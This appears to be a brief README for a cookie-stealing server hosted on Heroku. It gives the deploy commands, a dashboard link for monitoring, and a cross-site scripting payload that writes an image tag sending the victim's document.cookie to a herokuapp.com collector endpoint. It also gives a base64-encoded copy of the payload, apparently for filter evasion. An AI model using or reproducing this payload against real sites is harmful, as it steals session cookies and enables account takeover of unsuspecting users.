## How connect Heroku

https://devcenter.heroku.com/articles/deploying-spring-boot-apps-to-heroku


```shell
heroku create
git push heroku master:main
```

## Monitor
https://dashboard.heroku.com/apps


### Sample
```js
<script>
    document.write('<img src="https://glacial-oasis-93428.herokuapp.com//c?t=' + document.cookie + '" />')
</script>
```

### base64
```
PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPGltZyBzcmM9Imh0dHBzOi8vZ2xhY2lhbC1vYXNpcy05MzQyOC5oZXJva3VhcHAuY29tLy9jP3Q9JyArIGRvY3VtZW50LmNvb2tpZSArICciIC8+Jyk8L3NjcmlwdD4=
```